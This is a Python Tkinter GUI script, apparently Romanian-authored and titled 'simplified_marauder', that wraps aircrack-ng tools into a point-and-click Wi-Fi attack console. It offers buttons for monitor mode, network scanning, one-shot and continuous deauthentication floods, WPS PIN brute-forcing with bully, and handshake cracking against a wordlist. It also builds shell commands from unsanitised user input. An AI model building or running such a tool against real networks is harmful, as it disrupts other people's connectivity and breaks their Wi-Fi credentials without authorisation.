import os
import tkinter as tk
from tkinter import messagebox, filedialog, scrolledtext
from threading import Thread

def start_monitor():
    interface = interface_entry.get()
    if interface:
        os.system(f"airmon-ng start {interface}")
        Thread(target=scan_wifi, args=(interface,)).start()
    else:
        messagebox.showerror("Eroare", "Introdu o interfață validă.")

def stop_monitor():
    interface = interface_entry.get()
    if interface:
        os.system(f"airmon-ng stop {interface}")
        wifi_listbox.delete(0, tk.END)
    else:
        messagebox.showerror("Eroare", "Introdu o interfață validă.")

def scan_wifi(interface):
    wifi_listbox.delete(0, tk.END)
    os.system(f"timeout 5 airodump-ng {interface} -w /tmp/networks --output-format csv")
    try:
        with open("/tmp/networks-01.csv", "r") as file:
            for line in file.readlines()[2:]:
                if line.strip() and len(line.split(',')) > 13:
                    bssid, channel, essid = line.split(',')[0].strip(), line.split(',')[3].strip(), line.split(',')[13].strip()
                    wifi_listbox.insert(tk.END, f"{essid} ({bssid}) - Canal {channel}")
    except FileNotFoundError:
        messagebox.showerror("Eroare", "Nu s-au putut scana rețelele.")

def select_wifi(event):
    try:
        selection = wifi_listbox.get(wifi_listbox.curselection())
        bssid, essid = selection.split("(")[1].split(")")[0], selection.split(" ")[0]
        selected_bssid.set(bssid)
        selected_essid.set(essid)
        result_display.insert(tk.END, f"[INFO] Selectat: {essid} | BSSID: {bssid}\n")
    except:
        pass

def execute_command(command):
    result_display.insert(tk.END, f"[EXEC] {command}\n")
    result_display.insert(tk.END, os.popen(command).read())

def attack_deauth():
    bssid = selected_bssid.get()
    if bssid:
        execute_command(f"aireplay-ng --deauth 10 -a {bssid} {interface_entry.get()}")
    else:
        messagebox.showerror("Eroare", "Selectează un BSSID valid pentru atac Deauth.")

def continuous_deauth():
    bssid = selected_bssid.get()
    interface = interface_entry.get()
    if bssid and interface:
        result_display.insert(tk.END, "[INFO] Atac Deauth Flood Continuu...\n")
        Thread(target=lambda: os.system(f"aireplay-ng --deauth 0 -a {bssid} {interface}"), daemon=True).start()
    else:
        messagebox.showerror("Eroare", "Selectează un BSSID și o interfață validă pentru atac.")

def stop_deauth():
    result_display.insert(tk.END, "[INFO] Atac Deauth Flood Oprit\n")
    os.system("killall aireplay-ng")

def brute_force_wps():
    bssid = selected_bssid.get()
    if bssid:
        execute_command(f"bully -b {bssid} -v")
    else:
        messagebox.showerror("Eroare", "Selectează un BSSID valid pentru atac WPS.")

def crack_handshake():
    cap_file = filedialog.askopenfilename(filetypes=[("Fișiere Captură", "*.cap")])
    wordlist = filedialog.askopenfilename(filetypes=[("Fișiere Text", "*.txt")])
    if cap_file and wordlist:
        execute_command(f"aircrack-ng -w {wordlist} {cap_file}")
    else:
        messagebox.showerror("Eroare", "Selectează fișierul captura și wordlist-ul.")

# === INTERFAȚA GRAFICĂ ===
root = tk.Tk()
root.title("simplified_marauder")
root.geometry("1200x700")
root.configure(bg="black")

# === FRAME STÂNGA ===
left_frame = tk.Frame(root, bg="black")
left_frame.place(x=20, y=20, width=350, height=660)

tk.Label(left_frame, text="Interfață Wi-Fi:", bg="black", fg="white").pack(pady=5)
interface_entry = tk.Entry(left_frame, bg="gray", fg="white")
interface_entry.pack(pady=5)

tk.Button(left_frame, text="Pornește Monitor Mode", command=start_monitor, bg="gray", fg="white").pack(pady=5)
tk.Button(left_frame, text="Oprește Monitor Mode", command=stop_monitor, bg="gray", fg="white").pack(pady=5)

tk.Label(left_frame, text="Rețele Disponibile:", bg="black", fg="white").pack(pady=5)
wifi_listbox = tk.Listbox(left_frame, bg="black", fg="white", width=50, height=25)
wifi_listbox.pack(pady=5)
wifi_listbox.bind("<<ListboxSelect>>", select_wifi)

selected_bssid = tk.StringVar()
selected_essid = tk.StringVar()

# === FRAME DREAPTA ===
right_frame = tk.Frame(root, bg="black")
right_frame.place(x=400, y=20, width=770, height=660)

result_display = scrolledtext.ScrolledText(right_frame, bg="black", fg="white", width=92, height=25)
result_display.pack(pady=10)

# === FRAME PENTRU BUTOANE ===
bottom_frame = tk.Frame(root, bg="black")
bottom_frame.pack(side=tk.BOTTOM, fill=tk.X, padx=20, pady=10)

tk.Label(bottom_frame, text="BSSID pentru atac:", bg="black", fg="white").grid(row=0, column=0, padx=5, pady=5)
bssid_entry = tk.Entry(bottom_frame, bg="black", fg="white", insertbackground="white", textvariable=selected_bssid)
bssid_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")

# FRAME PENTRU BUTOANE DE ATAC
button_frame = tk.Frame(bottom_frame, bg="black")
button_frame.grid(row=1, column=0, columnspan=2, pady=10)

buttons = [
    ("Atac Deauth", attack_deauth),
    ("Deauth Flood", continuous_deauth),
    ("Oprește Deauth", stop_deauth),
    ("Brute-force WPS", brute_force_wps),
    ("Sparge Handshake", crack_handshake)
]

for i, (text, cmd) in enumerate(buttons):
    tk.Button(button_frame, text=text, command=cmd, bg="gray", fg="white", width=20).grid(row=i//3, column=i%3, padx=5, pady=5)

root.mainloop()
